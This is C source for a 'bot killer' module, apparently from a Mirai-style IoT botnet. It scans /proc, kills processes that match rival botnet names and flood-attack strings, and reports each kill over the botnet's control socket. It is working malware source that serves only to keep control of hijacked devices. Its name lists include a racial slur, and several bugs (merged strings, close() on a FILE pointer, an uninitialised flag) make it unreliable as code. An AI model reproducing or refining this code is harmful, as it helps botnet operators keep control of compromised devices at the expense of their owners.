// Bot killer by snickers

/*
only check pids that are >= 400
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <linux/limits.h>

pid_t killerid;
#define MAIN "[\x1b[34mkiller\x1b[37m]"

// use all lowercase in bin names/strings bc we set our resp as lowercase anyways
char *bin_names[] = {
	"dvrhelper",
	"dvrsupport",
	"mirai",
	"blade",
	"demon",
	"hoho",
	"hakai",
	"satori",
	"messiah",
	"mips",
	"mipsel",
	"sh4",
	"superh",
	"x86",
	"armv7",
	"armv6",
	"i686",
	"powerpc",
	"ppc",
	"i586",
	"m68k",
	"sparc",
	"armv4",
	"armv5",
	"440fp",
	"miori",
	"nigger",
	"kowai"
	"storm"
};
#define bin_names_size (sizeof(bin_names) / sizeof(unsigned char *))

char *bin_strings[] = {
	"lolnogtfo",
	"corona",
	"dups",
	"hakai",
	"satori",
	"masuta",
	"botnet",
	"cracked",
	"mirai",
	"slump",
	"demon",
	"hoho",
	"stdflood",
	"udpflood",
	"tcpflood",
	"httpflood",
	"chinese family",
	"messiah",
	"vsparkzyy",
	"shadoh",
	"osiris",
	"kowai",
	"miori",
	"nigger",
	"killer"
	"storm"
};
#define bin_strings_size (sizeof(bin_strings) / sizeof(unsigned char *))

void Trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

int kill_bk(void)
{
	if(kill(killerid, 9))
	{
		return 0;
	}
	else
	{
		return 1;
	}
}

int check_exe(void)
{
    int fd;
    char path[PATH_MAX];

    sprintf(path, "/proc/%d/exe", getpid());

    if ((fd = open(path, O_RDONLY)) == -1)
        return 0;

    close(fd);
    return 1;
}

void botkiller(int MySock)
{
	killerid = fork();
	if(killerid > 0 || killerid == -1)
		return;
	
	if (!check_exe()) return;
#ifdef DEBUGA
	printf(INFO" Killer started...\n");
#endif
	
	int num;
	DIR *dir;
	int pid = 0;
	FILE *target;
	int exefound;
	char resp[1024];
	char mydir[100];
	char buffer[512];
	char exefile[100];
	char mapfile[100];
	int sleep_time = 1;
	int least_pid = 400;
	int max_pid = 99000 + 1;
	int myprocpid = getpid();
	int last_killed_pid = 0;
	
	while(1)
	{
		for(pid=least_pid; pid < max_pid; pid++)
		{
			if(pid == myprocpid) return;
			if(exefound) exefound = 0;
			snprintf(mydir, sizeof(mydir), "/proc/%d/", pid);
			dir = opendir(mydir);
			if(dir) // found dir
			{
				//printf(INFO"-"SUCCESS" Found -> %s\n", mydir);
				snprintf(exefile, sizeof(exefile), "/proc/%d/exe", pid);
				target = fopen(exefile, "r");
				if(target != NULL)
				{
					while(fgets(buffer, sizeof(buffer) - 1, target))
					{
						Trim(buffer);
						for(num = 0; buffer[num]; num++)
							buffer[num] = tolower(buffer[num]);
						for(num = 0; num < bin_strings_size; num++)
						{
							if(strstr(buffer, bin_strings[num]))
							{
								memset(resp, 0, sizeof(resp));
								if(pid != last_killed_pid)
								{
									snprintf(resp, sizeof(resp), MAIN" String match found -> \x1b[35m%s\x1b[37m:\x1b[31m%d\x1b[37m\r\n", bin_strings[num], pid);
									if(send(MySock, resp, strlen(resp), 0) == -1) return;
								}
								kill(pid, 9);
								exefound = 1;
								memset(resp, 0, sizeof(resp));
								if(pid != last_killed_pid)
								{
									snprintf(resp, sizeof(resp), MAIN" Killed bot process -> \x1b[33m%d\x1b[37m\r\n", pid);
									if(send(MySock, resp, strlen(resp), 0) == -1) return;
								}
								last_killed_pid = pid;
							}
						}
					}
					if(!exefound) goto mapskill;
				}
				else
				{
					mapskill:
					close(target);
					snprintf(mapfile, sizeof(mapfile), "/proc/%d/maps", pid);
					target = fopen(mapfile, "r");
					if(target != NULL) // do maps kill
					{
						while(fgets(buffer, sizeof(buffer) - 1, target))
						{
							Trim(buffer);
							for(num = 0; buffer[num]; num++)
								buffer[num] = tolower(buffer[num]);
							for(num = 0; num < bin_names_size; num++)
							{
								if(strstr(buffer, bin_names[num]))
								{
									memset(resp, 0, sizeof(resp));
									if(pid != last_killed_pid)
									{
										if(strstr(buffer, "deleted"))
										{
											snprintf(resp, sizeof(resp), MAIN" Deleted binary match found -> \x1b[32m%s\x1b[37m:\x1b[36m%d\x1b[37m\r\n", bin_names[num], pid);
											if(send(MySock, resp, strlen(resp), 0) == -1) return;
										}
										else
										{
											snprintf(resp, sizeof(resp), MAIN" Binary match found -> \x1b[32m%s\x1b[37m:\x1b[36m%d\x1b[37m\r\n", bin_names[num], pid);
											if(send(MySock, resp, strlen(resp), 0) == -1) return;
										}
									}
									kill(pid, 9);
									memset(resp, 0, sizeof(resp));
									if(pid != last_killed_pid)
									{
										snprintf(resp, sizeof(resp), MAIN" Killed bot process -> \x1b[33m%d\x1b[37m\r\n", pid);
										if(send(MySock, resp, strlen(resp), 0) == -1) return;
									}
									last_killed_pid = pid;
								}
							}
						}
					}
				}
			}
			else if(ENOENT == errno)
				continue; /* Directory does not exist. */
			//else
				//printf("Failed to try directory :(\n");
			// now below we close our directory, file, and wipe all set memory from our data so less mem leaks
			close(target);
			closedir(dir);
			memset(resp, 0, sizeof(resp));
			memset(mydir, 0, sizeof(mydir));
			memset(buffer, 0, sizeof(buffer));
			memset(exefile, 0, sizeof(exefile));
			memset(mapfile, 0, sizeof(mapfile));
		}
		last_killed_pid = 0;
		sleep(2.5); // lets give them 2.5 seconds to kill our bot ;) + so we dont over run the killer on the device and make it too slow
	}
	//return;
}
